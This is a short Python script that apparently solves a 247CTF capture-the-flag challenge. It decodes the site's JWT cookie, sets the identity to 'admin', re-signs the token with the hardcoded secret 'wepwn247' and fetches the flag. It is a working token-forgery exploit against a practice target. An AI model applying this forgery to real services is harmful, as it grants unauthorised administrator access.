import requests
import jwt
import re
import base64
import json

url = "https://f41014b8ee5cd1db.247ctf.com/"

# get cookie
cookie_name = 'access_token_cookie'

res = requests.get(f'{url}/flag')

cookie = res.cookies[cookie_name]
token = json.loads(base64.b64decode(cookie.split(".")[1] + '==').decode())

# admin token
secret = 'wepwn247'

token['identity'] = 'admin'
payload = jwt.encode(token, secret, algorithm='HS256')

res = requests.get(f"{url}/flag", cookies={ cookie_name: payload })

flag = re.findall(r'(247CTF{.+})', res.text)[0]
print("Flag:", flag)